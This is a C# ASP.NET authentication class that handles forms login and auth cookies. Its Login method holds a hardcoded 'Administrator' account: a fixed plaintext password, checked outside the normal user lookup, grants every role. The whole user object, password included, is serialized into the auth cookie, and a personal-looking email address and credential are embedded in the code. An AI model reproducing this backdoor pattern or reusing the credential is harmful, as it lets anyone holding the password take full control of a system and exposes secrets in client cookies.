using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using System.Web.Security;

namespace Authentication
{
    public class SystemAuthenticate
    {
        private static string _LoginUrl;
        private static string _AccessDeniedUrl;

        public static SystemCommon.Error Login(IUserLogin user)
        {
            SystemCommon.Error error = SystemCommon.Error.LoginFail;
            if (!FormsAuthentication.CookiesSupported)
                error = SystemCommon.Error.NotSupportCookie;
            else if (user.UserName != "Administrator")
            {
                UserPrincipal userPrincipal = ManagerUser.GetUserPrincipal(user, ref error);
                if (error == SystemCommon.Error.LoginSuccess)
                {
                    userPrincipal.Languague = user.Languague;
                    SystemAuthenticate.SetAuthCookie(userPrincipal);
                }
            }
            else
            {
                if (user.Password != "135402765a@")
                    return error;
                UserPrincipal user1 = new UserPrincipal()
                {
                    ID = 1,
                    FullName = "Administrator",
                    Email = "vanduytk5@gmail.com",
                    Account = "Administrator",
                    Password = "135402765a@",
                    Remember = true,
                    RoleIDs = ManagerUser.GetAllRoles()
                };
                error = SystemCommon.Error.LoginSuccess;
                user1.Languague = user.Languague;
                SystemAuthenticate.SetAuthCookie(user1);
            }
            return error;
        }
        public static void SetAuthCookie(UserPrincipal user)
        {
            if (user == null)
                return;
            FormsAuthentication.SetAuthCookie(JsonConvert.SerializeObject((object)user), user.Remember);
        }
        public static void SetUserPrincipal()
        {
            UserPrincipal authCookie = SystemAuthenticate.GetAuthCookie();
            if (authCookie == null)
                return;
            authCookie.InitIdentity();
            HttpContext.Current.User = (IPrincipal)authCookie;
        }
        public static UserPrincipal GetAuthCookie()
        {
            IPrincipal user = HttpContext.Current.User;
            UserPrincipal userPrincipal = (UserPrincipal)null;
            if (user != null && user.Identity.IsAuthenticated && user.Identity.AuthenticationType == "Forms")
                userPrincipal = (UserPrincipal)JsonConvert.DeserializeObject<UserPrincipal>(user.Identity.Name);
            return userPrincipal;
        }
    }
}
